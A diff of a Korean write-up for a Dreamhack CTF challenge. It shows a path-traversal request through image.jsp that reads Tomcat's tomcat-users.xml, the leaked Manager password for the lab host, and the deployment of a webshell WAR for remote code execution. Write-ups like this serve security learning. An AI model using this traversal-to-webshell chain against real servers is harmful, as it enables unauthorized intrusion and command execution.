@@ -4,22 +4,11 @@
 
 문제 페이지에서 이미지 파일을 불러오는 `image.jsp?file=...` 요청을 확인한다. `file` 파라미터로 파일 경로를 전달하는 구조이므로 다른 경로도 지정할 수 있는지 살펴본다.
 
+<img width="1451" height="682" alt="image" src="https://github.com/user-attachments/assets/04495f0e-d9cb-4bc6-b5bb-939a9e576eed" />
+
 ### 2. 요청 분석 — Path Traversal로 관리자 설정 파일 접근
 
-**① `file` 파라미터에 상위 디렉터리 이동 경로를 입력한다.**
-
-**`image.jsp`의 실제 서버 소스코드는 확보하지 못했으므로 내부 구현 코드를 단정할 수 없다.** 아래는 Burp Repeater에서 사용한 HTTP 요청이다.
-
-```http
-GET /image.jsp?file=/../../../../../../usr/local/tomcat/conf/tomcat-users.xml HTTP/1.1
-Host: host3.dreamhack.games:12275
-```
-
-`../`는 상위 디렉터리로 이동하는 경로 표현이다. `file` 값에 이를 반복해 넣고 Tomcat 설정 파일인 `/usr/local/tomcat/conf/tomcat-users.xml`을 요청했다.
-
-해당 설정 파일의 내용이 응답에 노출되었다면 `file`에 지정한 경로가 의도된 디렉터리 밖의 파일 접근에 사용되는 **Path Traversal**이 성립한다. 이는 요청·응답 동작으로 판단한 것으로, 구현이 `FileInputStream`을 사용했는지는 확인되지 않았다.
-
-**② `tomcat-users.xml`에서 관리 권한을 확인한다.**
+**① `tomcat-users.xml`에서 관리 권한을 확인한다.**
 
 ```xml
 <role rolename="manager-gui"/>
@@ -29,20 +18,59 @@ Host: host3.dreamhack.games:12275
 <user username="tomcat" password="[SECRET]"
       roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
 ```
+<br>
 
-`tomcat` 계정에 `manager-gui` 등 관리 권한이 부여되어 있다.
+**② `file` 파라미터에 상위 디렉터리 이동 경로를 입력한다.**
 
-### 3. Tomcat Manager 로그인 — `/manager/html`은 어떻게 알았을까?
+아래는 Burp Repeater에서 사용한 HTTP 요청이다.
+
+```http
+GET /image.jsp?file=/../../../../../../usr/local/tomcat/conf/tomcat-users.xml HTTP/1.1
+Host: host3.dreamhack.games:14594
+```
+
+`../`는 상위 디렉터리로 이동하는 경로 표현이다. `file` 값에 이를 반복해 넣고 Tomcat 설정 파일인 `/usr/local/tomcat/conf/tomcat-users.xml`을 요청했다.
+
+<br>
+<br>
+<img width="1543" height="415" alt="image" src="https://github.com/user-attachments/assets/bd643307-aa34-47fa-84db-893463d55bc8" />
+<br>
+
+
+
+```http
+user username="tomcat" password="P2assw0rd_4_t0mC2tM2nag3r31337" 
+```
+<br>
+
+
+### 3. Tomcat Manager 로그인
+
 
 `tomcat-users.xml`의 `manager-gui` 권한을 보고 **Tomcat의 기본 관리 애플리케이션(Manager)**을 이용하는 계정임을 알 수 있다.
 
-Tomcat 공식 문서에서 웹 관리 화면은 `/manager/html` 경로를 사용한다. 즉, 이 주소는 파일 내용에서 직접 발견한 것이 아니라 **Tomcat의 표준 관리 경로를 확인한 것**이다.
+Tomcat 공식 문서에서 웹 관리 화면은 `/manager/html` 경로를 사용한다.
+
+<img width="1561" height="313" alt="image" src="https://github.com/user-attachments/assets/e26174ba-862c-42db-9521-df24388d5ab3" />
+
+<br>
+<br>
 
 ```text
 http://서버주소:포트/manager/html
 ```
 
+<br>
+<br>
 앞에서 확인한 `tomcat` 계정으로 로그인하니 **Tomcat Web Application Manager** 화면에 접속할 수 있었다.
+<br>
+<br>
+
+<img width="1919" height="756" alt="image" src="https://github.com/user-attachments/assets/b160a88f-5efd-417b-bbc2-bc2712c6d0c4" />
+
+
+
+
 
 이 화면에는 실행 중인 애플리케이션 목록과 **WAR file to deploy** 기능이 있다. WAR를 올려 새 JSP 애플리케이션을 배포할 수 있다.
 
@@ -85,6 +113,23 @@ if (cmd != null) {
 
 따라서 WAR를 배포하면 서버에서 명령어를 실행하고 결과를 볼 수 있다. **Tomcat Manager의 WAR 배포 권한을 통한 RCE**인 것이다.
 
+<img width="895" height="298" alt="image" src="https://github.com/user-attachments/assets/00209578-42a1-47ed-bdb8-9bf8ec7cc426" />
+
+<img width="897" height="274" alt="image" src="https://github.com/user-attachments/assets/be047e8b-4d6d-469b-bd7c-0dd92aa5ec41" />
+
+<img width="897" height="429" alt="image" src="https://github.com/user-attachments/assets/159f8170-6783-4ff5-9464-868d34247367" />
+
+<img width="815" height="131" alt="image" src="https://github.com/user-attachments/assets/a005f46c-64b9-4f8f-b8e7-f527b984665d" />
+
+<img width="480" height="324" alt="image" src="https://github.com/user-attachments/assets/d3540b37-5f85-4aad-9e02-dea064c6ea93" />
+
+<img width="475" height="322" alt="image" src="https://github.com/user-attachments/assets/6e564a4a-5694-4ba3-9c81-3b08dcdf578a" />
+
+<img width="561" height="84" alt="image" src="https://github.com/user-attachments/assets/5b30fdd8-fec0-4e52-869b-1fb28f0dbc28" />
+
+
+
+
 Tomcat Manager의 **WAR file to deploy**에 `webshell.war`를 업로드하고 `Deploy`를 누른다. WAR 파일 이름이 `webshell.war`이므로 기본 배포 경로는 `/webshell`이 된다.
 
 ### 5. 웹 셸에서 FLAG 확인
@@ -112,4 +157,4 @@ Host: host3.dreamhack.games:14594
 
 > **취약점 원인:** `image.jsp?file=` 요청의 Path Traversal로 `tomcat-users.xml`에 접근할 수 있었고, 유출된 관리자 계정으로 Tomcat Manager에 로그인한 뒤 WAR 배포 기능을 이용해 서버에서 코드를 실행할 수 있었다.
 
-**참고 자료:** [Tomcat Manager 공식 문서](https://tomcat.apache.org/tomcat-8.5-doc/html-manager-howto.html) · [사용한 WAR 파일 GitHub](https://github.com/tghosth/webshelljar)
+
